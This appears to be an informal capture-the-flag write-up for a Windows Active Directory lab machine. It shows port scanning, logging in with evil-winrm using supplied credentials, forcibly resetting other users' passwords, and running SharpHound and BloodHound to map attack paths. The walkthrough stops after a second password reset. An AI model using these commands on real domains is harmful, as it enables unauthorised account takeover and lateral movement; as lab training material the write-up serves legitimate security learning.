Category: Windows
Difficulty: Medium

Do a quick Nmap scan

```
nmap -p- -sS -sV -sC -Pn -T4 --min-rate=1000 --max-retries=3 -oN full_scan.log 10.10.11.42
```

Results:

```
# Nmap 7.94SVN scan initiated Wed Feb 19 11:57:31 2025 as: /usr/lib/nmap/nmap --privileged -p- -sS -sV -sC -Pn -T4 --min-rate=1000 --max-retries=3 -oN full_scan.log 10.10.11.42
Warning: 10.10.11.42 giving up on port because retransmission cap hit (3).
Nmap scan report for 10.10.11.42
Host is up (0.041s latency).
Not shown: 64445 closed tcp ports (reset), 1065 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-19 23:41:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57398/tcp open  msrpc         Microsoft Windows RPC
63440/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
63445/tcp open  msrpc         Microsoft Windows RPC
63452/tcp open  msrpc         Microsoft Windows RPC
63465/tcp open  msrpc         Microsoft Windows RPC
63497/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h43m03s
| smb2-time: 
|   date: 2025-02-19T23:42:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 19 11:59:04 2025 -- 1 IP address (1 host up) scanned in 92.50 seconds

```

Open up a shell using the given user and passwords

```
evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
```

Take a look at what user are there

```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            alexander                benjamin
emily                    emma                     ethan
Guest                    krbtgt                   michael
olivia
The command completed with one or more errors.

```

Test out and attempted to change everyone's password for abit because I can't exploit windows for nuts and in the end i settled for this:

```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael Password123
The command completed successfully.
```

Obviously we shall also run another shell:

```
evil-winrm -i 10.10.11.42 -u 'michael' -p 'Password123'
```

Well, feels like I'm pretty darn important:

```
*Evil-WinRM* PS C:\Users\michael\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\michael\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

let's find out whats my domain name too:

```
*Evil-WinRM* PS C:\Users\michael\Documents> ipconfig /all | findstr /I "Primary DNS Suffix"
   Primary Dns Suffix  . . . . . . . : administrator.htb
   DNS Suffix Search List. . . . . . : administrator.htb
   Connection-specific DNS Suffix  . :
   DNS Servers . . . . . . . . . . . : 127.0.0.1
```

look like we have enough information to ... BLOOOOOODHOUND ~ (sorry man, it's my first time using this too) time to install it first:

```
cd Desktop 

wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
```

then inside the Evil-WinRm shell, we gotta upload sharphound and uh... let it rip i guess:

```
*Evil-WinRM* PS C:\Users\michael\Documents> upload SharpHound.exe

Info: Uploading /home/kali/Desktop/SharpHound.exe to C:\Users\michael\Documents\SharpHound.exe

Data: 1395368 bytes of 1395368 bytes copied

*Evil-WinRM* PS C:\Users\michael\Documents> .\SharpHound.exe -c All
```

let's quickly download what we got:

```
*Evil-WinRM* PS C:\Users\michael\Documents> ls


    Directory: C:\Users\michael\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/19/2025   9:37 PM          11727 20250219213730_BloodHound.zip
-a----         2/19/2025   9:37 PM           8824 NDI3ZmMyMGItNzc4Ny00MzE1LTllNDItYTM4YTEzYjcyZDFj.bin
-a----         2/19/2025   9:36 PM        1046528 SharpHound.exe


*Evil-WinRM* PS C:\Users\michael\Documents> download 20250219213730_BloodHound.zip
 
Info: Downloading C:\Users\michael\Documents\20250219213730_BloodHound.zip to 20250219213730_BloodHound.zip

Info: Download successful!

```

lets get bloodhound up and running so first we gotta 

```
sudo neo4j console
```

so after setting up: doing the basic shit like changing my password since its my first time, i've entered bloodhound and have uploaded the zip file:

![Output](Attachments/1.png)

MATCH (u:User {name:"MICHAEL@ADMINISTRATOR.HTB"})-[r]->(t) RETURN u, r, t

```
┌──(kali㉿kali)-[~]
└─$ net rpc password "benjamin" "Password123" -U "administrator.htb"/"michael"%"Password123" -S "administrator.htb"

```

